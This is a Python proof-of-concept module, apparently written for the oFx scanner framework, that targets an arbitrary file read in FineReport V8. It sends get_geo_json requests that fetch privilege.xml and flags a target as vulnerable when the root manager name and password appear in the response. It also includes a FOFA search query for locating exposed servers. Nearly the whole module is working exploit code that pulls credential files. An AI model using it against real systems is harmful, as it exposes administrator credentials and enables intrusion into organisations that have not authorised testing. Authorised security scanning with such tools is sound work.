# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()

class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "帆软报表 V8 get_geo_json 任意文件读取漏洞",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "帆软报表 V8",  # 漏洞应用名称
        "AppVersion": "帆软报表 V8",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            FineReport每次发布新版本，都会让整个IT行业为之一振，带来一股帆软旋风。
            帆软公司用实际的行动，FineReport用突出的表现，再一次向外界证明，报表软件不是简简单单的细分领域软件，而是非常基础的、重要的软件，凡是有数据库的地方，都可以用报表软件。
            
            FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。
        """,  # 漏洞简要描述

        "fofa-dork": """
            body="isSupportForgetPwd"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        urls = [
            self.target + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
            self.target + "/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml",
                ]

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            for url in urls:
                req1 = requests.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
                if req1.status_code==200 and "PrivilegeManager" in req1.text and "rootManagerName" in req1.text and "rootManagerPassword" in req1.text:
                    vuln = [True, req1.text]
                    break
                else:
                    vuln = [False, req1.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
